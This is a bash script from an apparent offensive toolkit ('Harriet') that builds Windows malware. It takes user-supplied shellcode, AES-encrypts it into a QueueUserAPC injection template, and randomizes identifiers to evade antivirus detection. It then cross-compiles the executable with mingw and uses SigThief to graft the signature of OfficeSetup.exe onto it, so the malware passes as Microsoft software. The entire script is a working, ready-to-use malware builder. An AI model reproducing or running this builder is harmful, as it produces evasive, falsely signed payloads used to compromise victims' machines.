#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
 _____                       _   _                ___  ______  _____ 
|  _  |                     | | | |              / _ \ | ___ \/  __ \
| | | |_   _  ___ _   _  ___| | | |___  ___ _ __/ /_\ \| |_/ /| /  \/
| | | | | | |/ _ \ | | |/ _ \ | | / __|/ _ \ '__|  _  ||  __/ | |    
\ \/' / |_| |  __/ |_| |  __/ |_| \__ \  __/ |  | | | || |    | \__/\
 \_/\_\\__,_|\___|\__,_|\___|\___/|___/\___|_|  \_| |_/\_|     \____/
                                                                     
                                                                     
EOF
echo -e ${green}"Enter The Path To Your Shellcode File. ex: /home/user/Downloads/shellcode.bin"${clear}
echo ""
read Shellcode
echo ""
echo -e ${green}"Name Your Malware! ex: malware.exe"${clear}
echo ""
read MALWARE
echo ""
cp Harriet/QueueUserAPC/xor.py Harriet/QueueUserAPC/Resources/xor.py
cp Harriet/QueueUserAPC/template.cpp Harriet/QueueUserAPC/Resources/template.cpp
echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
echo ""
sleep 2
python3 Harriet/QueueUserAPC/Resources/aesencrypt.py $Shellcode > shell.txt
echo -e ${yellow}"***Encryption Completed***"${clear}
echo ""
cp shell.txt shell2.txt
#Generate AES Key
keys=$(cat "shell2.txt")
cut -d 'p' -f1 shell2.txt > shell3.txt
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" Harriet/QueueUserAPC/Resources/template.cpp

#Generate AES Payload
payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i Harriet/QueueUserAPC/Resources/template.cpp
sleep 2

#Replacing Random Values
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-8} | head -n 1 > shell.txt
Random1=$(cat shell.txt)
sed -i "s/Random1/$Random1/g" Harriet/QueueUserAPC/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random2=$(cat shell.txt)
sed -i "s/Random2/$Random2/g" Harriet/QueueUserAPC/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > shell.txt
Random3=$(cat shell.txt)
sed -i "s/Random3/$Random3/g" Harriet/QueueUserAPC/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > shell.txt
Random4=$(cat shell.txt)
sed -i "s/Random4/$Random4/g" Harriet/QueueUserAPC/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > shell.txt
Random5=$(cat shell.txt)
sed -i "s/Random5/$Random5/g" Harriet/QueueUserAPC/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
Random6=$(cat shell.txt)
sed -i "s/Random6/$Random6/g" Harriet/QueueUserAPC/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
Random7=$(cat shell.txt)
sed -i "s/Random7/$Random7/g" Harriet/QueueUserAPC/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
Random8=$(cat shell.txt)
sed -i "s/Random8/$Random8/g" Harriet/QueueUserAPC/Resources/template.cpp
rm shell*
echo -e ${yellow}"+++Compiling Malware+++"${clear}
x86_64-w64-mingw32-g++ -o $MALWARE Harriet/QueueUserAPC/Resources/template.cpp -fpermissive -Wno-narrowing -O2 -lntdll >/dev/null 2>&1
echo ""
sleep 2
echo -e ${yellow}"***Malware Compiled***"${clear}
echo ""
sleep 2
echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
echo ""
sleep 2
python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.exe -t $MALWARE -o signed.exe >/dev/null 2>&1
mv signed.exe $MALWARE
echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
echo ""
